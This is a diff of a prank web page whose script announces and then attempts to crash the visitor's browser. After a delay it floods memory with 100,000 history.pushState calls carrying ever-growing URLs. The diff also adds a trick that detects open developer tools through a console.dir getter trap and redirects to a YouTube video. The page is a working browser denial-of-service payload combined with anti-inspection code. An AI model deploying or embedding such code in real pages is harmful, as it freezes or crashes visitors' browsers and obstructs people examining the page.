@@ -2,33 +2,47 @@
   <b id="yeet"> Hi, enable javascript first so I can properly crash your browser </b>
   <script>
     	document.getElementById("yeet").innerHTML = "Alright, after 10sec your browser fill flood your memory, so if you change your mind just close this browser right now";
-    	window.onresize = function(){
- 		if((window.outerHeight-window.innerHeight)>100) {
-			window.location = "https://youtu.be/cLFHQjxv0pU"
-		}
-    	}
+        var checkStatus;
+        
+        var element = new Image();
+        Object.defineProperty(element, "id", {
+            get: function() {
+                checkStatus="on";
+                throw new Error("Dev tools checker");
+            }
+        })
+
+        requestAnimationFrame(function check() {
+            checkStatus = "off";
+            console.dir(element);
+            if (checkStatus == "on") {
+                window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+            }
+            requestAnimationFrame(check);
+        })
 	
-	function waitAsync(timer) {
-		if (!Number.isInteger(timer)) {
-			throw "Argument #1 is not Integer!";
-		}
+	    function waitAsync(timer) {
+		    if (!Number.isInteger(timer)) {
+			    throw "Argument #1 is not Integer!";
+		    }
 		
-		return new Promise((resolve) => {
-			setTimeout(function() {
-				resolve()
-			}, timer)
-		}) 
-	}  
-	  
-    	setTimeout(function(){
-      		document.getElementById("yeet").innerHTML = "Have fun!";
-      		waitAsync(500).then(function() {
-			var total = "";
-      			for( var i = 0; i < 100000; i++ ) {
+		    return new Promise((resolve) => {
+			    setTimeout(function() {
+				    resolve()
+			    }, timer)
+		    }) 
+        }  
+        
+        waitAsync(10000)
+            .then(function() {
+                document.getElementById("yeet").innerHTML = "Have fun!";
+      		    waitAsync(500).then(function() {
+			        var total = "";
+      			    for( var i = 0; i < 100000; i++ ) {
           			total = total + i.toString();
           			history.pushState(0,0, total );
-      			}
-		})
-    	}, 10000)
+      			    }
+		        })
+            })
   </script>
 </html>
